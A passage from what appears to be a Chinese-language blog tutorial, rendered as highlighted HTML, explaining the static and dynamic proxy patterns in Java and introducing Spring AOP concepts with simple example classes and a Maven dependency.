class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//房东要租房子</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理，中介帮房东租房子，但是代理会有一些附属操作</span><br>        <span class="hljs-type">Proxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(host);<br>        <span class="hljs-comment">//你不用面对房东，直接找中介租房子</span><br>        proxy.rent();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo01;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span>&#123;<br><br>    <span class="hljs-keyword">private</span> Host  host;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Proxy</span><span class="hljs-params">(Host host)</span> &#123;<br>        <span class="hljs-built_in">this</span>.host = host;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        host.rent();<br>        seeHouse();<br>        fare();<br>        hetong();<br>    &#125;<br><br>    <span class="hljs-comment">//看房</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带你看房&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//收中介费</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介收取中介费&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//签租赁合同</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hetong</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介签租赁合同&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749440.png" alt="img"></p><p>另一例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-comment">//真实对象</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;修改了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> UserServiceImpl userService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUserService</span><span class="hljs-params">(UserServiceImpl userService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.userService = userService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;add&quot;</span>);<br>        userService.add();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;delete&quot;</span>);<br>        userService.delete();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;update&quot;</span>);<br>        userService.update();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">()</span> &#123;<br>        log(<span class="hljs-string">&quot;query&quot;</span>);<br>        userService.query();<br>    &#125;<br><br>    <span class="hljs-comment">//日志方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[Debug] 使用了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo02;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理类</span><br>        <span class="hljs-type">UserServiceProxy</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceProxy</span>();<br>        <span class="hljs-comment">//使用代理类实现日志功能！</span><br>        proxy.setUserService(userService);<br>        proxy.add();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在不改变原来的代码的情况下，实现了对原有功能的增强，这是AOP中最核心的思想</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753869.png" alt="img"></p><h2 id="3-2-动态代理"><a href="#3-2-动态代理" class="headerlink" title="3.2 动态代理"></a>3.2 动态代理</h2><ul><li><p>动态代理和静态代理角色一样</p></li><li><p>动态代理的代理类是动态生成的，不是我们直接写好的</p></li><li><p>动态代理分为俩大类：基于接口的动态代理，基于类的动态代理</p></li><li><ul><li>基于接口–JDK 动态代理</li><li>基于类–cglib</li><li>java 字节码实现：javasist</li></ul></li></ul><p>了解俩个类：</p><ul><li>Proxy：代理</li><li>InvocationHandler：调用处理程序</li></ul><p><strong>动态代理的好处</strong></p><p>静态代理有的它都有，静态代理没有的，它也有！</p><ul><li>可以使得我们的真实角色更加纯粹 . 不再去关注一些公共的事情 .</li><li>公共的业务由代理来完成 . 实现了业务的分工 ,</li><li>公共业务发生扩展时变得更加集中和方便 .</li><li>一个动态代理 , 一般代理某一类业务</li><li>一个动态代理可以代理多个类，代理的是接口！</li></ul><p>案例一</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//房东</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Host</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;房东要出租房子&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-comment">//租房</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Rent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rent</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Rent rent;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRent</span><span class="hljs-params">(Rent rent)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rent = rent;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      rent.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        seeHouse();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> method.invoke(rent, args);<br>        <span class="hljs-comment">//return method.invoke(rent, args);</span><br>        fare();<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">seeHouse</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;中介带看房子&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fare</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;收中介费&quot;</span>);<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo03;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">Host</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Host</span>();<br>        <span class="hljs-comment">//代理角色，现在没有</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//通过调用程序处理角色来处理我们要调用的接口对象</span><br>        pih.setRent(host);<br>        <span class="hljs-type">Rent</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Rent) pih.getProxy();<br>        proxy.rent();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>案例二：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><br><span class="hljs-comment">//使用此类自动生成代理类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyInvocationHangler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">//被代理的接口</span><br>    <span class="hljs-keyword">private</span> Object target;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTarget</span><span class="hljs-params">(Object target)</span> &#123;<br>        <span class="hljs-built_in">this</span>.target = target;<br>    &#125;<br><br>    <span class="hljs-comment">//生成得到代理类</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getProxy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> Proxy.newProxyInstance(<span class="hljs-built_in">this</span>.getClass().getClassLoader(),<br>                                      target.getClass().getInterfaces(), <span class="hljs-built_in">this</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//处理代理实例，并返回结果</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable &#123;<br>        log(method.getName());<br>        <span class="hljs-comment">//动态代理的本质，就是使用反射机制实现</span><br>        <span class="hljs-keyword">return</span> method.invoke(target, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String msg)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;执行了&quot;</span>+msg+<span class="hljs-string">&quot;方法&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.demo04;<br><br><span class="hljs-keyword">import</span> com.kuang.demo02.UserService;<br><span class="hljs-keyword">import</span> com.kuang.demo02.UserServiceImpl;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//真实角色</span><br>        <span class="hljs-type">UserServiceImpl</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserServiceImpl</span>();<br>        <span class="hljs-comment">//代理角色，现在没有p</span><br>        <span class="hljs-type">ProxyInvocationHangler</span> <span class="hljs-variable">pih</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProxyInvocationHangler</span>();<br>        <span class="hljs-comment">//设置代理对象</span><br>        pih.setTarget(userService);<br>        <span class="hljs-comment">//动态生成代理类</span><br>        <span class="hljs-type">UserService</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (UserService) pih.getProxy();<br>        proxy.add();<br>        <span class="hljs-comment">//        proxy.delete();</span><br>        <span class="hljs-comment">//        proxy.update();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4、AOP"><a href="#4、AOP" class="headerlink" title="4、AOP"></a>4、AOP</h1><h3 id="4-1-AOP-简介"><a href="#4-1-AOP-简介" class="headerlink" title="4.1 AOP 简介"></a>4.1 AOP 简介</h3><h4 id="4-1-1-什么是-AOP"><a href="#4-1-1-什么是-AOP" class="headerlink" title="4.1.1 什么是 AOP"></a>4.1.1 什么是 AOP</h4><p>AOP（Aspect Oriented Programming）意为：面向切面编程，通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。<strong>AOP是OOP的延续</strong>，是软件开发中的一个热点，也是Spring框架中的一个重要内容，是函数式编程的一种衍生范型。利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311749875.webp" alt="img"></p><h4 id="4-1-2-Aop在Spring中的作用"><a href="#4-1-2-Aop在Spring中的作用" class="headerlink" title="4.1.2 Aop在Spring中的作用"></a>4.1.2 Aop在Spring中的作用</h4><p><strong>提供声明式事务；允许用户自定义切面</strong></p><p>以下名词简单了解：</p><ul><li>横切关注点：跨越应用程序多个模块的方法或功能。即是，与我们业务逻辑无关的，但是我们需要关注的部分，就是横切关注点。如日志 , 安全 , 缓存 , 事务等等 ….</li><li>切面（ASPECT）：横切关注点 被模块化 的特殊对象。即，它是一个类。</li><li>通知（Advice）：切面必须要完成的工作。即，它是类中的一个方法。</li><li>目标（Target）：被通知对象。</li><li>代理（Proxy）：向目标对象应用通知之后创建的对象。</li><li>切入点（PointCut）：切面通知 执行的 “地点”的定义。</li><li>连接点（JointPoint）：与切入点匹配的执行点。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753712.webp" alt="img"></p><p>SpringAOP中，通过Advice定义横切逻辑，Spring中支持5种类型的Advice:</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202510311753774.webp" alt="img"></p><p>即 Aop 在 不改变原有代码的情况下 , 去增加新的功能 </p><h4 id="4-1-3-使用Spring实现Aop"><a href="#4-1-3-使用Spring实现Aop" class="headerlink" title="4.1.3  使用Spring实现Aop"></a>4.1.3  使用Spring实现Aop</h4><p>【重点】使用AOP织入，需要导入一个依赖包！</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/org.aspectj/aspectjweaver --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.aspectj<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>aspectjweaver<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>首先编写我们的业务接口和实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-keyword">package</span> com.kuang.service;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;增加了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;删除了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;更新了一个用户&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">select</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;查询了一个用户&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="第一种方式：-通过-Spring-API-实现"><a href="#第一种方式：-通过-Spring-API-实现" class="headerlink" title="第一种方式： 通过 Spring API 实现"></a>第一种方式： 通过 Spring API 实现</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 